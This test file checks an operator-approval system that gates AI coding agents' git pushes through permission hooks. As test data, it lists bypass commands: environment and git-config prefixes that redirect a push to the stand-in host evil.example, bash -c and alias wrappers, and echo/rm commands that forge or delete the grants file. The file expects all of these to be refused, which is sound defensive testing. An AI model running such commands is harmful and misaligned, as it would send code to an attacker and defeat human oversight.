'use strict';
/**
 * HAG-49 action-bound approval. A grant covers one action class, one exact target
 * (remote URL, ref, sha), one agent, 60 minutes, and a 10-minute retry of the
 * identical action after first use. Minted only by the operator's Approve in the
 * app; stored in the self-protected policy directory. Entirely opt-in: nothing of
 * it exists unless a policy rule lists `grantable`.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const loadTs = require('./load-ts.cjs');

const electron = require.resolve('electron');
require.cache[electron] = {
  id: electron, filename: electron, loaded: true,
  exports: { Notification: class { show() {} static isSupported() { return false; } } }
};

const { canonicalAction, GrantStore, GrantDesk, GRANT_TTL_MS, GRANT_RETRY_MS } = loadTs('src/main/grants.ts');
const { PolicyEngine } = loadTs('src/main/policy.ts');
const { HiveManager } = loadTs('src/main/hive.ts');
const { HookServer } = loadTs('src/main/hooks.ts');
const { describeGrant, orderPending } = loadTs('src/renderer/src/components/approvals.ts');

const SHA = '270d83f1c2c5572d4eec1d66819c64168ecd7a61';
const SHA2 = '16932d7397ef17ba0c8db6b236a37fc46eb53f6b';
const URL = 'git@github.com:o/r.git';
const PUSH = `git push origin ${SHA}:refs/heads/feat/x`;
/** Remote names resolve per directory; `evil` points somewhere else. No push risks. */
const resolver = {
  pushUrl: (dir, remote) => (remote === 'origin' ? URL : remote === 'evil' ? 'git@evil.example:o/r.git' : null),
  pushRisk: () => null,
};

// --- What can be granted ---------------------------------------------------------

test('the one approvable form canonicalises to its exact target', () => {
  for (const command of [
    PUSH, `git push -u origin ${SHA}:refs/heads/feat/x`, `git -C /r push origin ${SHA}:refs/heads/feat/x`,
  ]) {
    const c = canonicalAction(command, '/r', resolver);
    assert.ok(c.ok, `${command}: ${c.why}`);
    assert.deepEqual(c.action.target, { remote_url: URL, ref: 'refs/heads/feat/x', sha: SHA });
    assert.equal(c.action.class, 'git-push');
  }
});

test('everything broader cannot be granted, with a reason', () => {
  for (const command of [
    `cd /r && ${PUSH}`, `git commit --amend --no-edit && ${PUSH}`, `git push --force origin ${SHA}:refs/heads/x`,
    `git push -f origin ${SHA}:refs/heads/x`, `git push --force-with-lease origin ${SHA}:refs/heads/x`,
    'git push --all origin', 'git push --tags origin', `git push --delete origin x`, 'git push origin feat/x',
    'git push origin HEAD:refs/heads/x', `git push origin ${SHA.slice(0, 8)}:refs/heads/x`, `git push origin ${SHA}:refs/tags/v1`,
    `git push origin ${SHA}:refs/heads/a ${SHA}:refs/heads/b`, `git push origin +${SHA}:refs/heads/x`,
    `git push origin ${SHA}:refs/heads/a..b`, 'git push origin $SHA:refs/heads/x', `git push nowhere ${SHA}:refs/heads/x`,
    `git -c alias.p=push p origin ${SHA}:refs/heads/x`, 'gh pr merge 12', `git push`,
    // Anything in front of git can change where the push goes (Dwight, HAG-49 H1).
    `bash -c "git push origin ${SHA}:refs/heads/feat/x"`,
    `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://evil.example/x.git ${PUSH}`,
    `env GIT_DIR=/tmp/other/.git ${PUSH}`, `/usr/bin/${PUSH}`,
  ]) {
    const c = canonicalAction(command, '/r', resolver);
    assert.equal(c.ok, false, command);
    assert.ok(c.why.length > 10, command);
  }
});

// --- Where the push really goes (real git) ---------------------------------------

const { execFileSync } = require('node:child_process');
function repo(t, ...config) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'md-grant-git-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  execFileSync('git', ['init', '-q', dir]);
  execFileSync('git', ['-C', dir, 'remote', 'add', 'origin', 'https://github.com/good/repo.git']);
  for (const [k, v] of config) execFileSync('git', ['-C', dir, 'config', k, v]);
  return dir;
}

test('the target is the PUSH url, so pushurl and pushInsteadOf cannot redirect an approved push', (t) => {
  const plain = canonicalAction(PUSH, repo(t));
  assert.equal(plain.action.target.remote_url, 'https://github.com/good/repo.git');
  const viaPushurl = canonicalAction(PUSH, repo(t, ['remote.origin.pushurl', 'https://evil.example/x.git']));
  assert.equal(viaPushurl.action.target.remote_url, 'https://evil.example/x.git');
  const viaInsteadOf = canonicalAction(PUSH, repo(t, ['url.https://evil.example/.pushInsteadOf', 'https://github.com/']));
  assert.equal(viaInsteadOf.action.target.remote_url, 'https://evil.example/good/repo.git');
});

test('a repo that would publish more than the approved ref cannot be granted', (t) => {
  for (const [k, v] of [['push.followTags', 'true'], ['push.recurseSubmodules', 'on-demand']]) {
    const c = canonicalAction(PUSH, repo(t, [k, v]));
    assert.equal(c.ok, false, k);
    assert.match(c.why, /more than the approved ref/);
  }
  assert.ok(canonicalAction(PUSH, repo(t, ['push.recurseSubmodules', 'check'])).ok, 'check only verifies');
});

// --- The store ----------------------------------------------------------------------

function store() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'md-grants-'));
  return { dir, s: new GrantStore(path.join(dir, 'grants.jsonl')) };
}
const action = (sha = SHA, url = URL) => ({ class: 'git-push', target: { remote_url: url, ref: 'refs/heads/feat/x', sha }, summary: '' });
const request = (agent = 'jim', a = action()) => ({ id: 'r_1', agent_id: agent, command: PUSH, cwd: '/r', reason: '', action: a, requested_at: '' });

test('a grant matches only its own agent, remote, ref and sha', () => {
  const { s } = store();
  const t0 = Date.parse('2026-09-29T12:00:00Z');
  const g = s.mint(request(), t0);
  assert.equal(s.findUsable('jim', action(), t0 + 1000).id, g.id);
  assert.equal(s.findUsable('pam', action(), t0 + 1000), null, 'another agent');
  assert.equal(s.findUsable('jim', action(SHA2), t0 + 1000), null, 'the sha moved');
  assert.equal(s.findUsable('jim', action(SHA, 'git@evil.example:o/r.git'), t0 + 1000), null, 'another remote');
  assert.equal(s.findUsable('jim', action(), t0 + GRANT_TTL_MS + 1), null, 'expired');
});

test('one use, then only the identical retry within 10 minutes', () => {
  const { s } = store();
  const t0 = Date.parse('2026-09-29T12:00:00Z');
  const g = s.mint(request(), t0);
  s.use(g, t0 + 60_000);
  assert.ok(s.findUsable('jim', action(), t0 + 60_000 + GRANT_RETRY_MS - 1), 'a retry inside the window');
  assert.equal(s.findUsable('jim', action(), t0 + 60_000 + GRANT_RETRY_MS + 1), null, 'not after it');
});

test('a torn or missing file grants nothing', () => {
  const { dir, s } = store();
  assert.equal(s.findUsable('jim', action()), null);
  fs.writeFileSync(path.join(dir, 'grants.jsonl'), '{"op":"mint","grant":{"id":"g_x","agent_id":"jim"\n');
  assert.equal(s.findUsable('jim', action()), null);
});

test('the desk mints only on Approve, once, from its own copy of the request', () => {
  const { dir, s } = store();
  const desk = new GrantDesk(s, resolver);
  const bad = desk.request('jim', { command: `git push --force origin ${SHA}:refs/heads/x`, cwd: '/r' });
  assert.equal(bad.ok, false);
  const r = desk.request('jim', { command: PUSH, cwd: '/r', reason: 'ship HAG-49' });
  assert.ok(r.ok);
  assert.equal(desk.pending().length, 1);
  const d = desk.decide(r.request.id, true);
  assert.ok(d.grant);
  assert.equal(desk.decide(r.request.id, true), null, 'decided once');
  assert.equal(desk.pending().length, 0);
  const denied = desk.request('jim', { command: PUSH, cwd: '/r' });
  assert.equal(desk.decide(denied.request.id, false).grant, null);
  const mints = fs.readFileSync(path.join(dir, 'grants.jsonl'), 'utf8').trim().split('\n').filter((l) => l.includes('"mint"'));
  assert.equal(mints.length, 1, 'Deny mints nothing');
});

// --- The engine ---------------------------------------------------------------------

const PUSH_RULE = {
  id: 'remote-push', decision: 'ask', mode: 'live', reason: 'Pushing is the operator\'s call.',
  grantable: ['git-push'], match: { tool: 'Bash', command_matches: '^git(?:\\s+-C\\s+\\S+)*\\s+push\\b' },
};
function engine(rules) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'md-grant-engine-'));
  fs.mkdirSync(path.join(root, 'policy'));
  fs.writeFileSync(path.join(root, 'policy', 'engine.json'), JSON.stringify({ version: 1, rules }));
  const rows = [];
  const e = new PolicyEngine(root, (r) => rows.push(r), () => [], () => [], () => false, resolver);
  e.load();
  return { e, rows, root, grants: new GrantStore(path.join(root, 'policy', 'grants.jsonl')) };
}
const pre = (command, agent_id = 'jim', cwd = '/r') => ({ hook_event_name: 'PreToolUse', agent_id, tool_name: 'Bash', tool_input: { command }, cwd });

test('grantable is validated at load', () => {
  for (const [bad, why] of [
    [{ ...PUSH_RULE, grantable: ['gh-pr'] }, /unknown action class/],
    [{ ...PUSH_RULE, grantable: [] }, /non-empty/],
    [{ ...PUSH_RULE, decision: 'deny' }, /only valid on an ask rule/],
  ]) {
    const { e, rows } = engine([bad]);
    assert.equal(e.ruleCount, 0);
    assert.match(rows.find((r) => r.kind === 'policy-load-failed').error, why);
  }
});

// A grant is used on a LATER call, so it can never answer a terminal prompt that is
// already open (day job, 2026-10-06: Approve in ASK ME, agent still stuck at the
// prompt). An approvable push with no grant is therefore DENIED with an "approval
// needed" verdict, so no prompt opens; the agent retries after Approve. Only what no
// grant could ever cover keeps the terminal prompt.
test('live: an approvable push with no grant is denied as approval-needed; a grant allows exactly it', () => {
  const { e, rows, grants } = engine([PUSH_RULE]);
  const first = e.evaluate(pre(PUSH));
  assert.equal(first.decision, 'deny', 'not ask: an ask opens a prompt no grant can answer');
  assert.equal(first.approvalNeeded, true);
  assert.equal(rows.at(-1).decision, 'deny');
  const g = grants.mint(request());
  const v = e.evaluate(pre(PUSH));
  assert.equal(v.decision, 'allow');
  assert.equal(v.grantId, g.id);
  assert.equal(rows.at(-1).grant_id, g.id);
  for (const [cmd, agent, why] of [
    [`git push origin ${SHA2}:refs/heads/feat/x`, 'jim', 'the sha moved'],
    [PUSH, 'pam', 'another agent'],
    [`git push evil ${SHA}:refs/heads/feat/x`, 'jim', 'a re-pointed remote'],
  ]) {
    const x = e.evaluate(pre(cmd, agent));
    assert.equal(x.decision, 'deny', why);
    assert.equal(x.approvalNeeded, true, why);
  }
  for (const [cmd, why] of [
    [`git push --force origin ${SHA}:refs/heads/feat/x`, 'force is never grantable'],
    [`git commit --amend --no-edit && ${PUSH}`, 'amend-and-push in one call'],
    ['git push origin main', 'not the approvable form'],
  ]) {
    const x = e.evaluate(pre(cmd));
    assert.equal(x.decision, 'ask', `${why}: the operator answers in the terminal`);
    assert.equal(x.approvalNeeded, undefined, why);
  }
});

test('live: an ask rule that is not grantable still asks', () => {
  const { e } = engine([{ ...PUSH_RULE, grantable: undefined }]);
  const v = e.evaluate(pre(PUSH));
  assert.equal(v.decision, 'ask');
  assert.equal(v.approvalNeeded, undefined);
});

test('live: a grant for the good URL is not used when the repo pushes elsewhere', (t) => {
  const dir = repo(t);
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'md-grant-engine-'));
  fs.mkdirSync(path.join(root, 'policy'));
  fs.writeFileSync(path.join(root, 'policy', 'engine.json'), JSON.stringify({ version: 1, rules: [PUSH_RULE] }));
  const e = new PolicyEngine(root, () => {});
  e.load();
  const grants = new GrantStore(path.join(root, 'policy', 'grants.jsonl'));
  grants.mint(request('jim', { class: 'git-push', target: { remote_url: 'https://github.com/good/repo.git', ref: 'refs/heads/feat/x', sha: SHA }, summary: '' }));
  execFileSync('git', ['-C', dir, 'config', 'remote.origin.pushurl', 'https://evil.example/x.git']);
  const redirected = e.evaluate(pre(PUSH, 'jim', dir));
  assert.equal(redirected.decision, 'deny', 'pushurl: the grant is not used');
  assert.equal(redirected.grantId, undefined);
  assert.equal(redirected.approvalNeeded, true, 'a fresh card would name the real (evil) URL');
  execFileSync('git', ['-C', dir, 'config', '--unset', 'remote.origin.pushurl']);
  assert.equal(e.evaluate(pre(`GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://evil.example/x.git ${PUSH}`, 'jim', dir)).decision, 'ask', 'env prefix');
  assert.equal(e.evaluate(pre(PUSH, 'jim', dir)).decision, 'allow', 'the approved push itself still goes');
});

// guardrail.json: a dry_run rule is a "Log only" backstop, which has no approvals, so a
// grant is neither used nor noted (it was noted as a would-be use before item 1).
test('a log-only backstop never uses or notes a grant', () => {
  const { e, root, grants } = engine([{ ...PUSH_RULE, mode: 'dry_run' }]);
  grants.mint(request());
  const v = e.evaluate(pre(PUSH));
  assert.equal(v.decision, 'allow');
  assert.equal(v.wouldDeny, true);
  assert.equal(v.grantId, undefined);
  assert.doesNotMatch(fs.readFileSync(path.join(root, 'policy', 'grants.jsonl'), 'utf8'), /"use"/);
});

test('an agent cannot forge or reset a grant: the grants file is self-protected', () => {
  const { e, root } = engine([PUSH_RULE]);
  const file = path.join(root, 'policy', 'grants.jsonl');
  assert.equal(e.evaluate({ hook_event_name: 'PreToolUse', agent_id: 'jim', tool_name: 'Write', tool_input: { file_path: file, content: '{}' } }).decision, 'deny');
  assert.equal(e.evaluate(pre(`echo '{"op":"mint"}' >> ${file}`)).decision, 'deny');
  assert.equal(e.evaluate(pre(`rm ${file}`)).decision, 'deny');
});

test('a rule without grantable never reads or creates the grants file', () => {
  const { grantable, ...plain } = PUSH_RULE;
  const { e, root } = engine([plain]);
  assert.equal(e.grantsActive, false);
  assert.equal(e.evaluate(pre(PUSH)).decision, 'ask');
  assert.equal(fs.existsSync(path.join(root, 'policy', 'grants.jsonl')), false);
});

// --- The floor: opt-in, and the whole flow when on ---------------------------------

async function floor(t, policy) {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'md-grant-floor-'));
  t.after(() => fs.rmSync(home, { recursive: true, force: true }));
  const hive = new HiveManager(() => home);
  if (policy) {
    fs.mkdirSync(path.join(home, 'hive', 'policy'), { recursive: true });
    fs.writeFileSync(path.join(home, 'hive', 'policy', 'engine.json'), JSON.stringify(policy));
  }
  const server = new HookServer(hive, () => null, () => ({}), undefined, undefined);
  // Wired exactly as index.ts wires it.
  hive.setApprovalHandler((agentId, msg) => server.handleApprovalRequest(agentId, msg));
  hive.setGrantsActive(() => server.grantsActive());
  await hive.ensureAgent({ id: 'god-1', name: 'God', provider: 'claude', cwd: home, isGod: true });
  const inj = await hive.ensureAgent({ id: 'jim-1', name: 'Jim', provider: 'claude', cwd: home });
  const prompt = inj.args[inj.args.indexOf('--append-system-prompt') + 1];
  const outbox = path.join(home, 'hive', 'agents', 'jim-1', 'outbox');
  const drop = (msg) => { fs.writeFileSync(path.join(outbox, `m-${Date.now()}-${Math.random()}.json`), JSON.stringify(msg)); hive.routeOnce(); };
  const inbox = (id) => { const d = path.join(home, 'hive', 'agents', id, 'inbox'); return fs.readdirSync(d).filter((f) => f.endsWith('.json')).map((f) => JSON.parse(fs.readFileSync(path.join(d, f), 'utf8'))); };
  const grantsFile = path.join(home, 'hive', 'policy', 'grants.jsonl');
  const log = () => { const f = path.join(home, 'hive', 'log.jsonl'); return fs.existsSync(f) ? fs.readFileSync(f, 'utf8') : ''; };
  return { home, hive, server, prompt, drop, inbox, grantsFile, log };
}
const REQUEST = { to: 'god', act: 'approval-request', subject: 'push', command: PUSH, cwd: '/r', reason: 'ship it' };

for (const [name, policy] of [['no policy file', null], ['a policy without grantable', { version: 1, rules: [{ ...PUSH_RULE, grantable: undefined }] }]]) {
  test(`off (${name}): no prompt line, no desk, no UI data, the request is routed as before`, async (t) => {
    const f = await floor(t, policy);
    assert.doesNotMatch(f.prompt, /approval-request/);
    assert.equal(f.server.grantsActive(), false);
    assert.deepEqual(f.server.pendingGrants(), []);
    assert.equal(f.server.decideGrant('r_x', true).ok, false);
    f.drop(REQUEST);
    assert.equal(f.inbox('god-1').length, 1, 'delivered to god like any message');
    assert.equal(f.inbox('jim-1').length, 0);
    assert.equal(fs.existsSync(f.grantsFile), false);
    assert.doesNotMatch(f.log(), /"kind":"grant-/);
  });
}

test('on: request, pending, Approve, grant message, and the engine allows exactly that push', async (t) => {
  const origin = fs.mkdtempSync(path.join(os.tmpdir(), 'md-grant-repo-'));
  t.after(() => fs.rmSync(origin, { recursive: true, force: true }));
  require('node:child_process').execFileSync('git', ['init', '-q', origin]);
  require('node:child_process').execFileSync('git', ['-C', origin, 'remote', 'add', 'origin', URL]);
  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
  assert.match(f.prompt, /approval-request/);
  f.drop({ ...REQUEST, cwd: origin });
  assert.equal(f.inbox('god-1').length, 1, 'god is told the agent is waiting');
  assert.match(f.inbox('jim-1')[0].subject, /Approval requested/);
  const [p] = f.server.pendingGrants();
  assert.equal(p.action.target.remote_url, URL);
  assert.equal(f.server.decideGrant(p.id, true).ok, true);
  assert.equal(f.server.decideGrant(p.id, true).ok, false, 'decided once');
  assert.ok(f.inbox('jim-1').some((m) => m.act === 'agree' && /Grant g_/.test(m.body)));
  const e = new PolicyEngine(path.join(f.home, 'hive'), () => {});
  e.load();
  assert.equal(e.evaluate(pre(PUSH, 'jim-1', origin)).decision, 'allow');
  assert.equal(e.evaluate(pre(PUSH, 'jim-1', origin)).decision, 'allow', 'the identical retry');
  assert.match(f.log(), /"kind":"grant-decided"[^\n]*"approved":true/);
});

function gitRepo(t) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'md-grant-repo-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  require('node:child_process').execFileSync('git', ['init', '-q', dir]);
  require('node:child_process').execFileSync('git', ['-C', dir, 'remote', 'add', 'origin', URL]);
  return dir;
}
const hook = (f, command, cwd) => f.server.handle({
  agent_id: 'jim-1', session_id: 's1', hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, cwd,
});
/** The hook's own decision; `none` leaves it to Claude Code's permission mode. */
const decisionOf = (out) => out?.hookSpecificOutput?.permissionDecision ?? 'none';

test('on: a push with no grant is denied, raises its own Approvals card once, and runs after Approve', async (t) => {
  const origin = gitRepo(t);
  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
  assert.match(f.prompt, /refused with a request id[^.]*\. End your turn/, 'the agent knows a refusal is the card, not a failure');
  assert.doesNotMatch(f.prompt, /without approval stops at a prompt/);
  const out = await hook(f, PUSH, origin);
  assert.equal(decisionOf(out), 'deny', 'no terminal prompt: a grant could never answer it');
  const [p] = f.server.pendingGrants();
  assert.ok(p, 'the deny raised the Approvals card');
  assert.equal(p.command, PUSH);
  const why = out.hookSpecificOutput.permissionDecisionReason;
  assert.match(why, new RegExp(p.id), 'the agent is told which request');
  assert.match(why, /Approved/);
  assert.ok(why.includes(PUSH), 'the exact command to run after Approve');
  assert.equal(f.server.awaitingPolicyAnswer('jim-1'), false, 'no prompt, so no prompt hold and no prompt card');
  assert.ok(f.inbox('god-1').some((m) => /waiting on the operator/.test(m.subject)));
  assert.equal(decisionOf(await hook(f, PUSH, origin)), 'deny', 'a retry before Approve');
  assert.equal(f.server.pendingGrants().length, 1, 'a retry adds no second card');
  assert.equal(f.server.decideGrant(p.id, true).ok, true);
  // Day job 2026-10-06: the granted retry returned no decision, so an agent not in
  // bypassPermissions got Claude Code's own prompt AFTER Approve. The grant IS the
  // operator's yes: say allow.
  const granted = await hook(f, PUSH, origin);
  assert.equal(decisionOf(granted), 'allow', 'the retry after Approve runs, whatever the permission mode');
  assert.match(granted.hookSpecificOutput.permissionDecisionReason, /approved by the operator/i);
  assert.match(f.log(), /"kind":"grant-requested"[^\n]*"via":"hook"/);
});

test('on: an approval-request sent first is the card; the push before Approve adds no second one', async (t) => {
  const origin = gitRepo(t);
  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
  f.drop({ ...REQUEST, cwd: origin });
  const [p] = f.server.pendingGrants();
  const out = await hook(f, PUSH, origin);
  assert.equal(decisionOf(out), 'deny');
  assert.match(out.hookSpecificOutput.permissionDecisionReason, new RegExp(p.id));
  assert.equal(f.server.pendingGrants().length, 1);
});

// Agents often retry with a shorter form ('git push', 'git push origin feat/x'). No
// grant can cover that, and an ask would open the prompt again; while this agent has
// a request waiting or an approved push unused, it is refused and given the exact
// approved command instead.
test('on: another push form while a request waits or a grant is open is refused with the exact command', async (t) => {
  const origin = gitRepo(t);
  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
  await hook(f, PUSH, origin);
  const [p] = f.server.pendingGrants();
  const waiting = await hook(f, 'git push', origin);
  assert.equal(decisionOf(waiting), 'deny', 'pending: no prompt');
  assert.match(waiting.hookSpecificOutput.permissionDecisionReason, new RegExp(p.id));
  assert.ok(waiting.hookSpecificOutput.permissionDecisionReason.includes(PUSH));
  f.server.decideGrant(p.id, true);
  for (const other of ['git push', 'git push origin feat/x', `git push origin HEAD:refs/heads/feat/x`]) {
    const out = await hook(f, other, origin);
    assert.equal(decisionOf(out), 'deny', other);
    assert.ok(out.hookSpecificOutput.permissionDecisionReason.includes(PUSH), `${other}: names the approved command`);
  }
  assert.equal(f.server.awaitingPolicyAnswer('jim-1'), false, 'no prompt was opened');
  assert.match(f.log(), /"kind":"grant-form-refused"[^\n]*"state":"approved"/);
  assert.equal(decisionOf(await hook(f, PUSH, origin)), 'allow', 'the grant was not spent by the refusals');
  assert.equal(f.server.pendingGrants().length, 0);
});

test('log only: a grant left from when it asked never becomes an explicit allow', async (t) => {
  const origin = gitRepo(t);
  const f = await floor(t, { version: 1, rules: [{ ...PUSH_RULE, mode: 'dry_run' }] });
  // A grant minted while the backstop was "Ask me", still within its hour.
  new GrantStore(f.grantsFile).mint({ id: 'r_old', agent_id: 'jim-1', command: PUSH, cwd: origin, reason: '', requested_at: '',
    action: { class: 'git-push', summary: '', target: { remote_url: URL, ref: 'refs/heads/feat/x', sha: SHA } } });
  assert.equal(decisionOf(await hook(f, PUSH, origin)), 'none', 'log only leaves the permission mode in charge');
  assert.doesNotMatch(fs.readFileSync(f.grantsFile, 'utf8'), /"op":"use"/, 'and the grant is not spent');
});

// Dwight L1: the refusal names the directory the approved command belongs to, so a
// push from another repo is not sent to run the wrong command in the wrong place.
test('on: a refusal from another repo names the approved command and its directory', async (t) => {
  const a = gitRepo(t);
  const b = gitRepo(t);
  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
  await hook(f, PUSH, a);
  const [p] = f.server.pendingGrants();
  f.server.decideGrant(p.id, true);
  const out = await hook(f, 'git push -u origin other', b);
  assert.equal(decisionOf(out), 'deny');
  const why = out.hookSpecificOutput.permissionDecisionReason;
  assert.ok(why.includes(PUSH));
  assert.ok(why.includes(a), 'the approved directory, by path');
  assert.doesNotMatch(why, /same directory/);
});

test('on: with nothing waiting or approved, another push form still asks', async (t) => {
  const origin = gitRepo(t);
  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
  assert.equal(decisionOf(await hook(f, 'git push', origin)), 'ask');
});

test('on: a push no grant can cover still opens the terminal prompt', async (t) => {
  const origin = gitRepo(t);
  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
  const out = await hook(f, 'git push --force origin main', origin);
  assert.equal(decisionOf(out), 'ask');
  assert.equal(f.server.awaitingPolicyAnswer('jim-1'), true);
  assert.deepEqual(f.server.pendingGrants(), []);
});

test('on: a request that cannot be granted is refused with the reason, and nothing is pending', async (t) => {
  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
  f.drop({ ...REQUEST, command: 'git push --force origin main' });
  const [m] = f.inbox('jim-1');
  assert.equal(m.act, 'refuse');
  assert.match(m.body, /cannot be approved/);
  assert.deepEqual(f.server.pendingGrants(), []);
});

// --- What the operator sees ----------------------------------------------------------

test('the approval card shows the canonical target in full before the agent\'s words', () => {
  const d = describeGrant({ id: 'r', agent_id: 'jim', command: PUSH, cwd: '/r', reason: 'why', requested_at: '1',
    action: { class: 'git-push', summary: 'Push feat/x', target: { remote_url: URL, ref: 'refs/heads/feat/x', sha: SHA } } });
  const labels = d.facts.map(([k]) => k);
  assert.deepEqual(labels.slice(0, 4), ['Agent', 'Branch', 'Commit', 'Remote']);
  assert.ok(labels.indexOf('Command') > labels.indexOf('Remote'));
  assert.equal(d.facts.find(([k]) => k === 'Commit')[1], SHA, 'the whole sha');
  assert.deepEqual(orderPending([{ requested_at: '2' }, { requested_at: '1' }]).map((x) => x.requested_at), ['1', '2']);
});

// --- Finish plan item 3: approvals survive an app restart ----------------------------

test('a pending request and an approved command survive a restart (a new desk on the same folder)', () => {
  const { dir, s } = store();
  const t0 = Date.parse('2026-10-06T12:00:00Z');
  const desk = new GrantDesk(s, resolver);
  const r = desk.request('jim', { command: PUSH, cwd: '/r', reason: 'ship' }, t0);
  const after = new GrantDesk(new GrantStore(path.join(dir, 'grants.jsonl')), resolver);
  assert.deepEqual(after.pending(t0 + 1000).map((q) => q.id), [r.request.id], 'still on the card after a restart');
  assert.equal(after.openFor('jim', t0 + 1000).state, 'pending');
  const d = after.decide(r.request.id, true, t0 + 2000);
  assert.ok(d.grant);
  const third = new GrantDesk(new GrantStore(path.join(dir, 'grants.jsonl')), resolver);
  const open = third.openFor('jim', t0 + 3000);
  assert.deepEqual([open.state, open.command, open.cwd], ['approved', PUSH, '/r'], 'the approved command is remembered too');
});

test('a request waiting more than 60 minutes expires; spent approvals are pruned from the file', () => {
  const { dir, s } = store();
  const t0 = Date.parse('2026-10-06T12:00:00Z');
  const desk = new GrantDesk(s, resolver);
  const r = desk.request('jim', { command: PUSH, cwd: '/r' }, t0);
  assert.equal(desk.pending(t0 + GRANT_TTL_MS + 1).length, 0, 'expired');
  assert.equal(desk.decide(r.request.id, true, t0 + GRANT_TTL_MS + 1), null, 'an expired request cannot be approved');
  const r2 = desk.request('jim', { command: PUSH, cwd: '/r' }, t0);
  const { grant } = desk.decide(r2.request.id, true, t0 + 1000);
  s.use(grant, t0 + 2000);
  const state = () => JSON.parse(fs.readFileSync(path.join(dir, 'grant-desk.json'), 'utf8'));
  assert.equal(state().approved.length, 1);
  assert.equal(desk.openFor('jim', t0 + 2000 + GRANT_RETRY_MS + 1), null, 'spent: past the retry window');
  assert.equal(state().approved.length, 0, 'and pruned from the file');
});

test('a torn desk file starts empty and says nothing is approved', () => {
  const { dir, s } = store();
  fs.writeFileSync(path.join(dir, 'grant-desk.json'), '{ torn');
  const desk = new GrantDesk(s, resolver);
  assert.deepEqual(desk.pending(), []);
  assert.equal(desk.openFor('jim'), null);
});

test('after an app restart, the approved push runs and another form still gets the exact command', async (t) => {
  const origin = gitRepo(t);
  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
  await hook(f, PUSH, origin);
  const [p] = f.server.pendingGrants();
  f.server.decideGrant(p.id, true);
  const restarted = new HookServer(f.hive, () => null, () => ({}), undefined, undefined);
  const h2 = (command) => restarted.handle({ agent_id: 'jim-1', session_id: 's2', hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, cwd: origin });
  const other = await h2('git push');
  assert.equal(decisionOf(other), 'deny');
  assert.ok(other.hookSpecificOutput.permissionDecisionReason.includes(PUSH), 'the exact command, remembered across the restart');
  assert.equal(decisionOf(await h2(PUSH)), 'allow');
});
